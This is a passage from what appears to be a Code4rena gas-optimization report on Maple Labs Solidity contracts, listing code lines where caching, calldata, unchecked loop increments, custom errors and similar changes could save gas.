[435-437](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L435-L437))\n```solidity\n        return IERC20(asset_).balanceOf(address(this))\n            - (asset_ == _collateralAsset ? _collateral : uint256(0))                   // `_collateral` is `_collateralAsset` accounted for.\n            - (asset_ == _fundsAsset ? _claimableFunds + _drawableFunds : uint256(0));  // `_claimableFunds` and `_drawableFunds` are `_fundsAsset` accounted for.\n```\n46. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [442](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L442))\n```solidity\n        return IMapleLoanFactory(_factory()).mapleGlobals();\n```\n47. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [460](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L460))\n```solidity\n        return principal_ <= drawableFunds_ ? uint256(0) : (collateralRequired_ * (principal_ - drawableFunds_)) / principalRequested_;\n```\n48. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [486](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L486))\n```solidity\n        if (raisedRate <= SCALED_ONE) return ((principal_ - endingPrincipal_) / totalPayments_, uint256(0));\n```\n49. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [486](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L486))\n```solidity\n        if (raisedRate <= SCALED_ONE) return ((principal_ - endingPrincipal_) / totalPayments_, uint256(0));\n```\n50. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [496](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L496))\n```solidity\n        return (principal_ * _getPeriodicInterestRate(interestRate_, interval_)) / SCALED_ONE;\n```\n51. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [548](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L548))\n```solidity\n        if (currentTime_ + paymentInterval_ < nextPaymentDueDate_) return (0, 0);\n```\n52. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [548](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L548))\n```solidity\n        if (currentTime_ + paymentInterval_ < nextPaymentDueDate_) return (0, 0);\n```\n53. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [580](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L580))\n```solidity\n        if (currentTime_ <= nextPaymentDueDate_) return 0;\n```\n54. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [595](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L595))\n```solidity\n        return (interestRate_ * interval_) / uint256(365 days);\n```\n55. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [600](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L600))\n```solidity\n        return keccak256(abi.encode(refinancer_, deadline_, calls_));\n```\n56. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [193](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L193))\n```solidity\n        return (issuanceRate * 365 days * 1e6) / (totalSupply * precision);\n```\n57. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [197](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L197))\n```solidity\n        return convertToAssets(balanceOf[account_]);\n```\n58. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [259](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L259))\n```solidity\n        if (issuanceRate == 0) return freeAssets;\n```\n59. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [266](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L266))\n```solidity\n        return ((issuanceRate * vestingTimePassed) / precision) + freeAssets;\n```\n60. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [285](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L285))\n```solidity\n       return (numerator_ / divisor_) + (numerator_ % divisor_ > 0 ? 1 : 0);\n```\n\n### `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [258](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L258))\n```solidity\n        for (uint256 i; i < calls_.length; ++i) {\n```\n\n### `<array>.length` should not be looked up in every loop of a `for`-loop\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [258](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L258))\n```solidity\n        for (uint256 i; i < calls_.length; ++i) {\n```\n\n### Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\n\n1. File: loan-3.0.0-beta.1/contracts/interfaces/IMapleLoanInitializer.sol (line [11](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IMapleLoanInitializer.sol#L11))\n```solidity\n        address[2] memory assets_,\n```\n2. File: loan-3.0.0-beta.1/contracts/interfaces/IMapleLoanInitializer.sol (line [12](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IMapleLoanInitializer.sol#L12))\n```solidity\n        uint256[3] memory termDetails_,\n```\n3. File: loan-3.0.0-beta.1/contracts/interfaces/IMapleLoanInitializer.sol (line [13](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IMapleLoanInitializer.sol#L13))\n```solidity\n        uint256[3] memory amounts_,\n```\n4. File: loan-3.0.0-beta.1/contracts/interfaces/IMapleLoanInitializer.sol (line [14](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IMapleLoanInitializer.sol#L14))\n```solidity\n        uint256[4] memory rates_\n```\n5. File: loan-3.0.0-beta.1/contracts/MapleLoanInitializer.sol (line [13](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInitializer.sol#L13))\n```solidity\n        address[2] memory assets_,\n```\n6. File: loan-3.0.0-beta.1/contracts/MapleLoanInitializer.sol (line [14](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInitializer.sol#L14))\n```solidity\n        uint256[3] memory termDetails_,\n```\n7. File: loan-3.0.0-beta.1/contracts/MapleLoanInitializer.sol (line [15](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInitializer.sol#L15))\n```solidity\n        uint256[3] memory amounts_,\n```\n8. File: loan-3.0.0-beta.1/contracts/MapleLoanInitializer.sol (line [16](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInitializer.sol#L16))\n```solidity\n        uint256[4] memory rates_\n```\n\n### Stack variable used as a cheaper cache for a state variable is only used once\nIf the variable is only accessed once, it's cheaper to use the state variable directly that one time\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [293](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L293))\n```solidity\n        uint256 paymentsRemaining = _paymentsRemaining;\n```\n2. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [298](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L298))\n```solidity\n        uint256 paymentInterval = _paymentInterval;\n```\n3. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [307](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L307))\n```solidity\n        address fundsAsset = _fundsAsset;\n```\n\n### State variables should be cached in stack variables rather than re-reading them from storage\nThe instances below point to the second access of a state variable within a function\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [270](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L270))\n```solidity\n        uint256 paymentInterval  = _paymentInterval;\n```\n2. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [154](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L154))\n```solidity\n        _drawableFunds = (_drawableFunds + _getUnaccountedAmount(_fundsAsset)) - (principalAndInterest + delegateFee_ + treasuryFee_);\n```\n3. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [181](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L181))\n```solidity\n        _drawableFunds = (_drawableFunds + _getUnaccountedAmount(_fundsAsset)) - (principalAndInterest + delegateFee_ + treasuryFee_);\n```\n4. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [265](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L265))\n```solidity\n        uint256 extraDelegateFee = (_delegateFee * timeSinceLastPaymentDueDate) / (preRefinancePaymentInterval * _paymentsRemaining);\n```\n5. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [275](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L275))\n```solidity\n        _setEstablishmentFees(_principal, paymentInterval, extraDelegateFee, extraTreasuryFee);\n```\n6. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [266](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L266))\n```solidity\n        return ((issuanceRate * vestingTimePassed) / precision) + freeAssets;\n```\n7. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [92](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L92))\n```solidity\n        emit VestingScheduleUpdated(msg.sender, vestingPeriodFinish, issuanceRate);\n```\n8. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [185](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L185))\n```solidity\n        issuanceRate = (lastUpdated = block.timestamp) > vestingPeriodFinish ? 0 : issuanceRate;\n```\n9. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [266](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L266))\n```solidity\n        return ((issuanceRate * vestingTimePassed) / precision) + freeAssets;\n```\n10. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [264](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L264))\n```solidity\n                block.timestamp - lastUpdated;\n```\n11. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [92](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L92))\n```solidity\n        emit VestingScheduleUpdated(msg.sender, vestingPeriodFinish, issuanceRate);\n```\n12. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [263](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L263))\n```solidity\n                vestingPeriodFinish - lastUpdated :\n```\n13. File: xMPL-1.0.0-beta.1/contracts/xMPL.sol (line [84](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L84))\n```solidity\n        emit MigrationScheduled(asset, newAsset_, migrator_, scheduledMigrationTimestamp);\n```\n\n### Splitting `require()` statements that use `&&` saves gas\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) for an example\n\n1. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (lines [80-84](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L80-L84))\n```solidity\n        require(\n            uint256(s_) <= uint256(0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) &&\n            (v_ == 27 || v_ == 28),\n            \"ERC20:P:MALLEABLE\"\n        );\n```\n2. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [98](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L98))\n```solidity\n            require(recoveredAddress == owner_ && owner_ != address(0), \"ERC20:P:INVALID_SIGNATURE\");\n```\n3. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [233](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L233))\n```solidity\n        require((token_ != _fundsAsset) && (token_ != _collateralAsset), \"L:S:INVALID_TOKEN\");\n```\n4. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [296](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L296))\n```solidity\n        require((_nextPaymentDueDate == uint256(0)) && (paymentsRemaining != uint256(0)), \"MLI:FL:LOAN_ACTIVE\");\n```\n5. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (lines [361-364](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L361-L364))\n```solidity\n        require(\n            nextPaymentDueDate != uint256(0) && (block.timestamp > nextPaymentDueDate + _gracePeriod),\n            \"MLI:R:NOT_IN_DEFAULT\"\n        );\n```\n\n### `internal` functions only called once should be inlined to save gas\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [402](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L402))\n```solidity\n    function _getEarlyPaymentBreakdown() internal view returns (uint256 principal_, uint256 interest_, uint256 delegateFee_, uint256 treasuryFee_) {\n```\n2. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [413](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L413))\n```solidity\n    function _getNextPaymentBreakdown() internal view returns (uint256 principal_, uint256 interest_, uint256 delegateFee_, uint256 treasuryFee_) {\n```\n3. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (lines [450-456](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L450-L456))\n```solidity\n    function _getCollateralRequiredFor(\n        uint256 principal_,\n        uint256 drawableFunds_,\n        uint256 principalRequested_,\n        uint256 collateralRequired_\n    )\n        internal pure returns (uint256 collateral_)\n```\n4. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (lines [500-512](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L500-L512))\n```solidity\n    function _getPaymentBreakdown(\n        uint256 currentTime_,\n        uint256 nextPaymentDueDate_,\n        uint256 paymentInterval_,\n        uint256 principal_,\n        uint256 endingPrincipal_,\n        uint256 paymentsRemaining_,\n        uint256 interestRate_,\n        uint256 lateFeeRate_,\n        uint256 lateInterestPremium_\n    )\n        internal pure\n        returns (uint256 principalAmount_, uint256 interestAmount_)\n```\n5. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (lines [534-545](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L534-L545))\n```solidity\n    function _getRefinanceInterestParams(\n        uint256 currentTime_,\n        uint256 paymentInterval_,\n        uint256 principal_,\n        uint256 endingPrincipal_,\n        uint256 interestRate_,\n        uint256 paymentsRemaining_,\n        uint256 nextPaymentDueDate_,\n        uint256 lateFeeRate_,\n        uint256 lateInterestPremium_\n    )\n        internal pure returns (uint256 refinanceInterest_, uint256 timeSinceLastPaymentDueDate_)\n```\n6. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [625](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L625))\n```solidity\n    function _scaledExponent(uint256 base_, uint256 exponent_, uint256 one_) internal pure returns (uint256 result_) {\n```\n7. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [273](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L273))\n```solidity\n    function _reduceCallerAllowance(address caller_, address owner_, uint256 shares_) internal {\n```\n\n### `abi.encode()` is less efficient than `abi.encodePacked()` for non-dynamic types\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanInitializer.sol (line [18](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInitializer.sol#L18))\n```solidity\n        return abi.encode(borrower_, assets_, termDetails_, amounts_, rates_);\n```\n\n### Functions guaranteed to revert when called by normal users can be marked `payable`\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\n\n1. File: xMPL-1.0.0-beta.1/contracts/xMPL.sol (line [43](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L43))\n```solidity\n    function cancelMigration() external override onlyOwner {\n```\n2. File: xMPL-1.0.0-beta.1/contracts/xMPL.sol (line [51](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L51))\n```solidity\n    function performMigration() external override onlyOwner {\n```\n3. File: xMPL-1.0.0-beta.1/contracts/xMPL.sol (line [76](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L76))\n```solidity\n    function scheduleMigration(address migrator_, address newAsset_) external override onlyOwner {\n```\n\n### Use a more recent version of solidity\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n1. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [2](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n2. File: erc20-1.0.0-beta.2/contracts/interfaces/IERC20.sol (line [2](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n3. File: loan-3.0.0-beta.1/contracts/MapleLoanFactory.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanFactory.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n4. File: loan-3.0.0-beta.1/contracts/MapleLoan.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoan.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n5. File: loan-3.0.0-beta.1/contracts/Refinancer.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/Refinancer.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n6. File: loan-3.0.0-beta.1/contracts/interfaces/IOwnable.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IOwnable.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n7. File: loan-3.0.0-beta.1/contracts/interfaces/Interfaces.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/Interfaces.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n8. File: loan-3.0.0-beta.1/contracts/interfaces/IMapleLoanFactory.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IMapleLoanFactory.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n9. File: loan-3.0.0-beta.1/contracts/interfaces/IMapleLoan.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IMapleLoan.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n10. File: loan-3.0.0-beta.1/contracts/interfaces/IRefinancer.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IRefinancer.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n11. File: loan-3.0.0-beta.1/contracts/interfaces/IMapleLoanEvents.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IMapleLoanEvents.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n12. File: loan-3.0.0-beta.1/contracts/interfaces/IMapleLoanInitializer.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IMapleLoanInitializer.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n13. File: loan-3.0.0-beta.1/contracts/MapleLoanInitializer.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInitializer.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n14. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [2](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n15. File: mpl-migration-1.0.0-beta.1/contracts/Migrator.sol (line [2](https://github.com/maple-labs/mpl-migration/blob/a99549d96ed12cd4589a02bccf70747dbaebeb5b/contracts/Migrator.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n16. File: mpl-migration-1.0.0-beta.1/contracts/interfaces/Interfaces.sol (line [2](https://github.com/maple-labs/mpl-migration/blob/a99549d96ed12cd4589a02bccf70747dbaebeb5b/contracts/interfaces/Interfaces.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n17. File: mpl-migration-1.0.0-beta.1/contracts/interfaces/IMigrator.sol (line [2](https://github.com/maple-labs/mpl-migration/blob/a99549d96ed12cd4589a02bccf70747dbaebeb5b/contracts/interfaces/IMigrator.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n18. File: revenue-distribution-token-1.0.0-beta.1/contracts/interfaces/IRevenueDistributionToken.sol (line [2](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/interfaces/IRevenueDistributionToken.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n19. File: revenue-distribution-token-1.0.0-beta.1/contracts/interfaces/IERC4626.sol (line [2](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/interfaces/IERC4626.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n20. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [2](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n21. File: xMPL-1.0.0-beta.1/contracts/interfaces/IxMPL.sol (line [2](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/interfaces/IxMPL.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n22. File: xMPL-1.0.0-beta.1/contracts/xMPL.sol (line [2](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L2))\n```solidity\npragma solidity 0.8.7;\n```\n\n### Using `private` rather than `public` for constants, saves gas\nIf needed, the value can be read from the verified contract source code\n\n1. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [41](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L41))\n```solidity\n    bytes32 public constant override PERMIT_TYPEHASH = bytes32(0xfc77c2b9d30fe91687fd39abb7d16fcdfe1472d065740051ab8b13e4bf4a617f);\n```\n2. File: xMPL-1.0.0-beta.1/contracts/xMPL.sol (line [20](https://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L20))\n```solidity\n    uint256 public constant override MINIMUM_MIGRATION_DELAY = 10 days;\n```\n\n\n### Using `bool`s for storage incurs overhead\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\nThis type of issue was also flagged in the [prior contest](https://github.com/code-423n4/2021-12-maple-findings/issues/64).\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanFactory.sol (line [11](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanFactory.sol#L11))\n```solidity\n    mapping(address => bool) public override isLoan;\n```\n\n### Use custom errors rather than revert strings for cheaper deployment costs\nMany places throughout all of the non-interface contracts\n\n### DOMAIN_SEPARATOR should not be fully re-calculated during every call\n```solidity\n    function DOMAIN_SEPARATOR() public view override returns (bytes32 domainSeparator_) {\n        return keccak256(\n            abi.encode(\n                keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                block.chainid,\n                address(this)\n            )\n        );\n    }\n```\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L119-L129\nCaching was mentioned in the [prior contest](https://github.com/code-423n4/2021-04-maple-findings/issues/2). See OpenZeppelin's implmementation where they cache the calculated value, as well as parts of the calculation, to speed up future calculations: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/52eeebecda140ebaf4ec8752ed119d8288287fac/contracts/utils/cryptography/draft-EIP712.sol#L70-L76\n\n### Move `requires()` before subsequent declarations to save gas\nThere's no need to fetch any of the other state variables if `migrationTimestamp` is not within the right bounds.\n```solidity\n    function performMigration() external override onlyOwner {\n        uint256 migrationTimestamp = scheduledMigrationTimestamp;\n        address migrator           = scheduledMigrator;\n        address oldAsset           = asset;\n        address newAsset           = scheduledNewAsset;\n\n        require(migrationTimestamp != 0,               \"xMPL:PM:NOT_SCHEDULED\");\n        require(block.timestamp >= migrationTimestamp, 